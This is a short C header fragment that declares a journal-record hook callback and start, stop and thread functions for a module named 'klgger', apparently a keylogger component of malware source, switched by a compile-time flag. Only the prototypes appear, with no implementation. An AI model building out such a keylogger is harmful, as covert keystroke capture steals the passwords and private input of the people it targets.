

#ifndef NO_klgGER
LRESULT CALLBACK journalrecord(int Code, WPARAM wParam, LPARAM lParam);
DWORD WINAPI klgger(LPVOID param);
bool klgger_start(char *szFileName);
bool klgger_stop();
#endif